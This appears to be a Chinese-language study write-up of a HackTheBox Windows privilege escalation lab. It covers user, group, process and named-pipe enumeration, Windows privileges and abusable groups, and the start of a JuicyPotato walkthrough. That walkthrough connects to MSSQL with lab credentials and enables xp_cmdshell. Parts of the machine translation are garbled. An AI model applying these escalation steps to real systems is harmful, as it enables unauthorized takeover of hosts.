<p><strong>当前用户, Current User</strong> 当我们访问主机时，应该先检查账户运行的用户环境。有时候，我们已经是系统或同等存在了！假设我们以服务账户身份获得访问权限。在这种情况下，我们可能拥有像 <code>SeImpersonatePrivilege</code> 这样的权限，这些权限常常很容易被滥用，用 <a href="https://github.com/ohpe/juicy-potato" rel="noreferrer" target="_blank">Juicy Potato</a> 等工具升级权限。</p>
<pre><code class="language-cmd-session">C:\htb&gt; echo %USERNAME%

htb-student </code></pre>
<p><strong>当前用户权限</strong> 如前所述，了解用户拥有哪些权限，有助于提升权限。我们本模块后面将探讨个人用户权限和升级路径。</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p><strong>当前用户组信息</strong> 我们的用户是否通过组成员身份继承了任何权利？它们是否在 Active Directory 域环境中享有特权，可以用来访问更多系统？</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</code></pre>
<p><strong>获取所有用户</strong> 了解系统上的其他用户也很重要。如果我们通过为用户 <code>bob</code> 捕获的凭据获得 RDP 访问主机，并且在本地管理员组中看到 <code>bob_adm</code> 用户，值得检查凭证是否复用。我们能访问重要用户的用户档案目录吗？我们可能会在用户的桌面、文档或下载文件夹中找到有价值的文件，如带有密码或 SSH 密钥的脚本。</p>
<pre><code class="language-cmd-session">C:\htb&gt; net user

User accounts for \\WINLPE-SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
helpdesk                 htb-student              jordan
sarah                    secsvc
The command completed successfully.</code></pre>
<p><strong>获取所有的组</strong> 了解主机上存在哪些非标准组可以帮助我们判断主机的用途、访问频率，甚至可能导致发现配置错误，比如远程桌面中的所有域用户或本地管理员组。</p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup

Aliases for \\WINLPE-SRV01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.</code></pre>
<p><strong>一个组的详细信息</strong> 值得查看非标准团体的详细信息。虽然不太可能，但我们可能会在该群组的描述中找到密码或其他有趣的信息。在列举过程中，我们可能会发现另一位非管理员用户的凭证，他是本地组成员，可用于升级权限。</p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
helpdesk
sarah
secsvc
The command completed successfully. </code></pre>
<p><strong>获取密码政策及其他账户信息</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.</code></pre>
<h3>与进程交互</h3>
<p>寻找权限升级的最佳地点之一是系统上正在运行的进程。即使进程不以管理员身份运行，也可能获得额外的权限。最常见的例子是发现一台像 IIS 或 XAMPP 这样的 Web 服务器运行在主机上，放置 <code>aspx/php</code> shell，并以运行 Web 服务器的用户身份获得 shell。通常，这不是管理员，但通常会有 <code>SeImpersonate</code> 令牌，允许 <code>Rogue/Juicy/Lonely Potato</code> 提供系统权限。</p>
<p><strong>Access Tokens 访问令牌</strong> 在 Windows 中， 访问令牌用于描述进程或线程的安全上下文（安全属性或规则）。令牌包含用户账户身份信息以及与特定进程或线程相关的权限。当用户向系统进行身份验证时，其密码会通过安全数据库进行验证，如果正确认证，他们将获得一个访问令牌。每当用户与进程交互时，都会显示该令牌的副本以确定其权限等级。</p>
<h3>枚举网络服务</h3>
<p>人们与进程交互最常见的方式是通过网络套接字（DNS、HTTP、SMB 等）。<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" rel="noreferrer" target="_blank">netstat</a> 命令会显示当前的 TCP 和 UDP 连接，这能让我们更好地了解哪些服务在本地和外部可访问的端口上监听。我们可能会发现只有本地主机登录后才能访问的漏洞服务，可以利用它来升级权限。</p>
<p><strong>显示主动网络连接</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       3812
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       936
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5044
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       528
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       996
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1260
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2008
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       1888
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       616
  TCP    10.129.43.8:139        0.0.0.0:0              LISTENING       4
  TCP    10.129.43.8:3389       10.10.14.3:63191       ESTABLISHED     936
  TCP    10.129.43.8:49671      40.67.251.132:443      ESTABLISHED     1260
  TCP    10.129.43.8:49773      52.37.190.150:443      ESTABLISHED     2608
  TCP    10.129.43.8:51580      40.67.251.132:443      ESTABLISHED     3808
  TCP    10.129.43.8:54267      40.67.254.36:443       ESTABLISHED     3808
  TCP    10.129.43.8:54268      40.67.254.36:443       ESTABLISHED     1260
  TCP    10.129.43.8:54269      64.233.184.189:443     ESTABLISHED     2608
  TCP    10.129.43.8:54273      216.58.210.195:443     ESTABLISHED     2608
  TCP    127.0.0.1:14147        0.0.0.0:0              LISTENING       3812

&lt;SNIP&gt;

  TCP    192.168.20.56:139      0.0.0.0:0              LISTENING       4
  TCP    [::]:21                [::]:0                 LISTENING       3812
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       836
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       936
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       5044
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       528
  TCP    [::]:49665             [::]:0                 LISTENING       996
  TCP    [::]:49666             [::]:0                 LISTENING       1260
  TCP    [::]:49668             [::]:0                 LISTENING       2008
  TCP    [::]:49669             [::]:0                 LISTENING       600
  TCP    [::]:49670             [::]:0                 LISTENING       1888
  TCP    [::]:49674             [::]:0                 LISTENING       616
  TCP    [::1]:14147            [::]:0                 LISTENING       3812
  UDP    0.0.0.0:123            *:*                                    1104
  UDP    0.0.0.0:500            *:*                                    1260
  UDP    0.0.0.0:3389           *:*                                    936

&lt;SNIP&gt;</code></pre>
<p>使用主动网络连接时，主要要注意的是那些在环回地址（<code>127.0.0.1</code> 和 <code>：：1</code>）上监听的条目，这些条目没有监听 IP 地址（<code>10.129.43.8</code>）或广播地址（<code>0.0.0.0</code>，<code>：：/0</code>）。原因是 localhost 上的网络套接字通常不安全，因为人们认为“它们无法被网络访问”。最明显的是 <code>14147</code> 号端口，用于 FileZilla 的管理界面。通过连接该端口，除了作为 FileZilla 服务器用户（可能是管理员）创建 f.P 共享的 c：\外，可能还能提取 FTP 密码。</p>
<h3>命名管道</h3>
<p>进程之间的另一种通信方式是通过命名管道。管道本质上是存储在内存中的文件，读取后会被清除。钴打击为每个命令（不含 <a href="https://www.cobaltstrike.com/help-beacon-object-files" rel="noreferrer" target="_blank">BOF</a>）使用命名管道。工作流程基本如下：</p>
<p>信标启动了一条名为 \.\pipe\ 的管道 msagent_12</p>
<p>信标启动一个新进程，并向该进程注入命令，将输出导向 \.\pipe\msagent_12</p>
<p>服务器显示写入 \.\pipe\ 的内容 msagent_12</p>
<ol><li>Beacon starts a named pipe of \.\pipe\msagent_12</li><li>Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12</li><li>Server displays what was written into \.\pipe\msagent_12</li></ol>
<p>这样做是因为如果被执行的命令被杀毒软件标记或崩溃，它不会影响信标（执行该命令的进程）。Cobalt Strike 用户经常会更换命名的管道，伪装成另一个程序。最常见的例子之一是用 mojo 代替 msagent。我最喜欢的发现之一是找到了一个带有 Mojo 的命名管道启动器，但电脑本身并没有安装 Chrome。幸运的是，这正是公司内部的红队。当外部顾问找到红队，而内部蓝队却没有时，这说明了很多问题。</p>
<p>管道用于两个应用程序或进程之间的通信，使用共享内存。管道分为两种类型， 命名管道和匿名管道。命名管道的一个例子是 <code>\\.\PipeName\\ExampleNamedPipeServer</code> 。Windows 系统使用客户端-服务器实现管道通信。在这种实现中，创建命名管道的进程是服务器，与命名管道通信的进程是客户端。命名管道可以通过<code>半双工</code>通信，或单向通道，客户端只能将数据写入服务器;或双<code>工</code> ，这是一种双向通信通道，允许客户端通过管道写入数据，服务器通过该管道回应数据。每一次与命名管道服务器的活跃连接都会生成一个新的命名管道。这些管道名称相同，但通过不同的数据缓冲区进行通信。</p>
<p><strong>用管道列表列出命名管道</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               -1
lsass                                             4               -1
ntsvcs                                            3               -1
scerpc                                            3               -1
Winsock2\CatalogChangeListener-340-0              1                1
Winsock2\CatalogChangeListener-414-0              1                1
epmapper                                          3               -1
Winsock2\CatalogChangeListener-3ec-0              1                1
Winsock2\CatalogChangeListener-44c-0              1                1
LSM_API_service                                   3               -1
atsvc                                             3               -1
Winsock2\CatalogChangeListener-5e0-0              1                1
eventlog                                          3               -1
Winsock2\CatalogChangeListener-6a8-0              1                1
spoolss                                           3               -1
Winsock2\CatalogChangeListener-ec0-0              1                1
wkssvc                                            4               -1
trkwks                                            3               -1
vmware-usbarbpipe                                 5               -1
srvsvc                                            4               -1
ROUTER                                            3               -1
vmware-authdpipe                                  1                1

&lt;SNIP&gt;</code></pre>
<p>此外，我们还可以用 PowerShell 使用 <code>gci</code>（<code>Get-ChildItem</code>）列出命名管道。</p>
<p><strong>用 PowerShell 列出命名管道</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt;  gci \\.\pipe\


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 InitShutdown
------       12/31/1600   4:00 PM              4 lsass
------       12/31/1600   4:00 PM              3 ntsvcs
------       12/31/1600   4:00 PM              3 scerpc


    Directory: \\.\pipe\Winsock2


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              1 Winsock2\CatalogChangeListener-34c-0


    Directory: \\.\pipe


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
------       12/31/1600   4:00 PM              3 epmapper

&lt;SNIP&gt;</code></pre>
<p>获得命名管道列表后，我们可以使用 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">Accesschk</a> 通过查看自由裁量访问列表（DACL）来枚举特定命名管道的权限，DACL 显示谁拥有修改、写入、读取或执行资源的权限。让我们来看看 <code>LSASS</code> 的流程。我们也可以使用命令 <code>.\accesschk.exe /accepteula \pipe\</code> 来审查所有命名管道的 DACL 。</p>
<h2>用户权限</h2>
<p>中的权限是指账户可以被授予在本地系统上执行各种作的权利，比如管理服务、加载驱动程序、关闭系统、调试应用程序等。权限不同于访问权，后者是系统用来授予或拒绝访问可保护对象的。用户和组权限存储在数据库中，用户登录系统时通过访问令牌授予。账户可以对特定计算机拥有本地权限，如果账户属于 Active Directory 域，则在不同系统上拥有不同的权限。每当用户尝试执行特权作时，系统会检查该用户的访问令牌，以确认账户是否具备所需权限，如果有，会检查这些令牌是否已被启用。大多数权限默认是被禁用的。有些可以通过打开管理 cmd.exe 或 PowerShell 控制台来启用，而另一些则可以通过手动启用。</p>
<p>评估的目标通常是获得对一个或多个系统的管理访问权限。假设我们可以以特定权限用户身份登录系统。在这种情况下，我们或许可以利用内置功能直接提升权限，或者利用目标账户分配的权限来进一步提升访问权限，以实现最终目标。</p>
<p><strong>Windows授权流程</strong> 安全主体是指任何可以被 Windows 操作系统认证的对象，包括用户账户和计算机账户、在安全上下文中运行的进程，或其他用户/计算机账户，或这些账户所属的安全组。安全主体是控制 Windows 主机资源访问的主要方式。每个安全主体都由唯一的安全标识符（SID） 标识。当创建安全主体时，会被分配一个 SID，该 SID 在其生命周期内一直分配给该主体。</p>
<p>下图从高层次讲解了 Windows 授权和访问控制流程，例如，当用户尝试访问文件共享中的可安全对象（如文件夹）时，该过程就开始了。在此过程中，用户的访问令牌（包括其用户 SID、其所属组的 SID、权限列表及其他访问信息）会与对象安全描述符内的访问控制条目（ACEs）进行比较（ACEs，ACEs 包含可保护对象的安全信息，如授予用户或组的访问权，下文将讨论）。一旦比较完成，就会决定是否授予访问。每当用户尝试访问 Windows 主机上的资源时，整个过程几乎瞬间发生。作为我们列举和特权提升活动的一部分，我们试图利用和滥用访问权，利用或介入该授权流程，以进一步推进目标的访问。</p>
<img alt="Pasted image 20260228022956" src="assets/posts/windows-privilege-escalation/Pasted image 20260228022956.png"/>
<p><strong>Windows中的权力与特权，Rights and Privileges</strong> Windows 包含许多赋予成员强大权利和特权的群体。其中许多都可能被滥用，在独立的 Windows 主机和 Active Directory 域环境中提升权限。最终，这些资源可以用来获得 Windows 工作站、服务器或域控制器（DC）上的域管理员、本地管理员或系统权限。以下列出其中一些团体。</p>
<div class="post-table-wrap"><table><thead><tr><th><strong>Group  集团</strong></th><th><strong>Description  描述</strong></th></tr></thead><tbody><tr><td>默认管理员</td><td>域管理员和企业管理员是“超级”组。</td></tr><tr><td>服务器运营者</td><td>成员可以修改服务、访问 SMB 共享和备份文件。</td></tr><tr><td>备用</td><td>成员可以本地登录 DC，应被视为域管理员。他们可以复制 SAM/NTDS 数据库的影子副本，远程读取注册表，并通过 SMB 访问 DC 上的文件系统。该组有时会加入非 DC 的本地备份组。</td></tr><tr><td>打印</td><td>成员可以登录本地的 DC，并“欺骗”Windows 加载恶意驱动程序。</td></tr><tr><td>管理员</td><td>如果存在虚拟数据中心，任何虚拟化管理员，如 Hyper-V 管理员成员，都应被视为域管理员。</td></tr><tr><td>账户运营方</td><td>成员可以修改域内非受保护的账户和组。</td></tr><tr><td>远程桌面用户</td><td>成员默认没有任何有用的权限，但通常会被赋予额外权限 <code>Allow Login Through Remote Desktop Services</code> ，比如，并且可以通过 RDP 协议进行横向移动。</td></tr><tr><td>远程管理用户</td><td>成员可以通过 PSRemoting 登录 DC（该组有时会加入非 DC 的本地远程管理组）。</td></tr><tr><td>组策略创建者所有者</td><td>成员可以创建新的 GPO，但需要被授权额外权限才能将 GPO 关联到容器，如域或 OU。</td></tr><tr><td>模式管理员</td><td>成员可以通过在默认对象 ACL 中添加被攻破的账户来修改 Active Directory 的模式结构，并对任何待创建的 Group/GPO 进行背门。</td></tr><tr><td>管理员</td><td>成员可以在 DC 上加载 DLL，但没有重启 DNS 服务器的必要权限。他们可以加载恶意 DLL，等待重启作为持久化机制。加载 DLL 通常会导致服务崩溃。利用该群体的更可靠方法是创建一个 WPAD 记录 。</td></tr></tbody></table></div>
<p><strong>用户权利转让</strong> 根据组成员身份以及通过域和本地组策略分配的权限等其他因素，用户可能会为其账户分配各种权限。这篇关于用户权利转让的 Microsoft 文章详细说明了 Windows 中可设置的每种用户权限以及适用于每个权限的安全考虑。以下是一些关键的用户权限分配，这些设置是应用于本地主机的。这些权限允许用户在系统上执行任务，如本地或远程登录、从网络访问主机、关闭服务器等。</p>
<div class="post-table-wrap"><table><thead><tr><th>设定常数</th><th>设定名称</th><th>标准作业</th><th>描述</th></tr></thead><tbody><tr><td>SeNetworkLogonRight</td><td>从网络访问这台电脑](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)</td><td>管理员，认证用户</td><td>决定哪些用户可以从网络连接到该设备。这被 SMB、NetBIOS、CIFS 和 COM+等网络协议要求。</td></tr><tr><td>SeRemoteInteractiveLogonRight</td><td>允许通过远程桌面服务登录](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services)</td><td>管理员，远程桌面用户</td><td>该策略设置决定哪些用户或组可以通过远程桌面服务连接访问远程设备的登录界面。用户可以建立与特定服务器的远程桌面服务连接，但无法登录该服务器的控制台。</td></tr><tr><td>SeBackupPrivilege  SeeBackupPrivilege</td><td>备份文件和目录](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)</td><td>管理人员</td><td>该用户权限决定哪些用户可以绕过文件和目录、注册表及其他持久对象权限以备份系统。</td></tr><tr><td>SeSecurityPrivilege</td><td>管理审计和安全日志](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)</td><td>管理人员</td><td>该策略设置决定哪些用户可以为单个资源（如文件、Active Directory 对象和注册表键）指定对象访问审计选项。这些对象指定其系统访问控制列表（SACL）。被赋予该用户权限的用户也可以在事件查看器中查看并清除安全日志。</td></tr><tr><td>特权</td><td>拥有文件或其他对象](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)</td><td>管理人员</td><td>该策略设置决定哪些用户可以拥有设备中任何可保护的对象，包括 Active Directory 对象、NTFS 文件和文件夹、打印机、注册表键、服务、进程和线程。</td></tr><tr><td>SeDebugPrivilege</td><td>调试程序</td><td>管理人员</td><td>该策略设置决定哪些用户可以连接或打开任何进程，即使是他们不拥有的进程。调试应用程序的开发者不需要这个用户权限。调试新系统组件的开发者需要这个用户权限。该用户权利允许访问敏感且关键的操作系统组件。</td></tr><tr><td>冒充特权</td><td>认证后冒充客户端](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)</td><td>管理员，本地服务，网络服务，服务</td><td>该策略设置决定哪些程序可以冒充用户或其他指定账户并代表用户行动。</td></tr><tr><td>SeLoadDriverPrivilege</td><td>加载和卸载设备驱动程序](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)</td><td>管理人员</td><td>该策略设置决定哪些用户可以动态加载和卸载设备驱动程序。如果设备上的 driver.cab 文件中已有新硬件的签名驱动，则无需使用此用户权利。设备驱动程序作为高权限代码运行。</td></tr><tr><td>SeRestorePrivilege  SeeRestorePrivilege</td><td>还原文件和目录](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)</td><td>管理人员</td><td>该安全设置决定哪些用户在恢复备份文件和目录时可以绕过文件、目录、注册表及其他持久对象权限。它决定哪些用户可以作为对象的所有者设置有效的安全主体。</td></tr><tr><td>特权</td><td>作为操作系统的一部分](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system)</td><td>管理员，本地服务，网络服务，服务</td><td>该安全设置决定进程是否可以冒充任何用户身份，并通过此获取目标用户被允许访问的资源（冒充）。这可能被分配给杀毒或备份工具，需要访问所有系统文件进行扫描或备份。该权限应保留给需要合法访问的服务账户。</td></tr></tbody></table></div>
<p>输入命令 <code>whoami /priv</code> 会显示分配给你当前用户的所有用户权限列表。有些权限仅对管理员用户开放，且只能在运行提升级的命令或 PowerShell 会话时列出或利用。这些提升权限和用户账户控制（UAC） 的概念是 Windows Vista 引入的安全功能，默认限制应用程序在非必要时无法完全权限运行。如果我们比较管理员在非提升控制台和升级控制台上可享有的权利，会发现它们差别很大。</p>
<p>以下是windows系统上本地管理员账户可用的权限</p>
<p><strong>本地管理员用户权限 - 提升</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami 

winlpe-srv01\administrator


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled </code></pre>
<p>当我们的账户在 <code>“禁用</code> ”状态下显示有权限时，说明我们的账户拥有该特权。不过，在启用之前，它不能用于访问令牌来执行相关作。Windows 没有内置命令或 PowerShell cmdlet 来启用权限，所以我们需要一些脚本来帮忙。在本模块中，我们将看到滥用各种特权的方法，以及在当前流程中实现特定特权的各种方式。一个例子是这个 PowerShell 脚本 ，可以用来启用某些权限， 或者这个脚本可以用来调整令牌权限。</p>
<p>相比之下，普通用户权限很少</p>
<p><strong>普通用户权力</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami 

winlpe-srv01\htb-student


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p>用户权利会根据他们被分配到的组或分配的权限而增加。以下是备份组中授予用户权利的一个示例。该组用户拥有 UAC 目前限制的其他权利。不过，从这个命令我们可以看出他们有 <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system" rel="noreferrer" target="_blank">SeShutdownPrivilege</a>，这意味着他们可以关闭一个域控制器，如果他们在本地登录域控制器（而不是通过 RDP 或 WinRM），可能会导致巨大的服务中断。</p>
<p><strong>Backup Operators Rights， 备用权力</strong></p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<p><strong>Detection  检测</strong></p>
<p>This <a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e" rel="noreferrer" target="_blank">post</a> is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672" rel="noreferrer" target="_blank">4672: Special privileges assigned to new logon</a> which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should _never_ be assigned or those that should only ever be assigned to specific accounts. 本文值得[](https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e)一读，了解更多关于 Windows 权限以及检测和防止滥用的信息，特别是通过记录事件 4672：分配给新登录的特殊权限 ，如果新登录会话被分配了某些敏感权限，该事件将引发事件。这可以通过多种方式进行微调，比如监控_不应_被分配的权限，或只应分配给特定账户的权限。</p>
<h3>SeImpersonate 与 SeAssignPrimaryToken 权限</h3>
<p>在 Windows 中，每个进程都有一个令牌，里面包含运行该账户的信息。这些令牌不被视为安全资源，因为它们只是内存中可能被无法读取内存的用户暴力破解的内存位置。要使用该令牌，需要具备<code>冒充</code>特权。该保护仅授予管理账户，且在大多数情况下可在系统加固过程中移除。使用该令牌的一个例子是 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a>。</p>
<p>合法程序可以利用其他进程的令牌从管理员升级到本地系统，后者拥有额外权限。进程通常通过调用 WinLogon 进程获取 SYSTEM 令牌，然后用该令牌执行自身，并将其置于 SYSTEM 空间中。攻击者常在“土豆式”私密账户中滥用此权限——服务账户可以<code>冒充</code> ，但无法获得完整的系统级权限。本质上，Potato 攻击欺骗以 SYSTEM 运行的进程连接到其进程，进进程交出供使用的令牌。</p>
<p>我们通常会在通过在服务账户上下文中运行的应用程序获得远程代码执行后获得此权限（例如，将网页壳上传到 ASP.NET 的网页应用，通过 Jenkins 安装实现远程代码执行，或通过 MSSQL 查询执行命令）。每当我们通过这种方式获得访问权限时，应立即检查是否有权限，因为它的存在通常为获得更高权限提供了快速且便捷的途径。本文值得一读，以了解更多关于代币冒充攻击的细节。</p>
<p><strong>Selmpersonate Example - JuicyPotato</strong> 我们以下面的例子为例，我们通过一个特权 SQL 用户在 SQL 服务器上站稳脚跟。客户端连接到 IIS 和 SQL Server 时可以配置为使用 Windows 认证。服务器随后可能需要访问其他资源，如文件共享，作为连接客户端。这可以通过冒充客户端连接所建立的上下文用户来实现。为此，服务账户将在认证权限后获得“ 冒充客户端 ”的授权。</p>
<p>在这种情况下，SQL Service 服务账户运行在默认的 <code>mssqlserver</code> 账户上下文中。想象一下，我们通过 <code>Snaffler</code> 工具实现了命令执行，用户使用 <code>xp_cmdshell</code> 在文件共享中获得的 <code>logins.sql</code> 文件中的一组凭证。</p>
<p>利用凭证 <code>sql_dev：Str0ng_P@ssw0rd！</code>，我们先连接到 SQL 服务器实例并确认权限。我们可以用 <code>Impacket</code> 工具包中的 <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" rel="noreferrer" target="_blank">mssqlclient.py</a> 来实现这一点。</p>
<ol><li>Connecting with MSSQLClient.py</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-mssqlclient sql_dev@10.129.28.157 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL&gt;</code></pre>
<p>接下来，我们必须启用 <code>xp_cmdshell</code> 存储过程来运行操作系统命令。我们可以通过输入 <code>enable_xp_cmdshell</code> 来实现 Impacket MSSSQL shell 的作。输入<code>help</code>时会显示一些其他命令选项。</p>
<ol><li>Enabling xp_cmdshell</li></ol>
<pre><code class="language-shell-session">SQL&gt; enable_xp_cmdshell

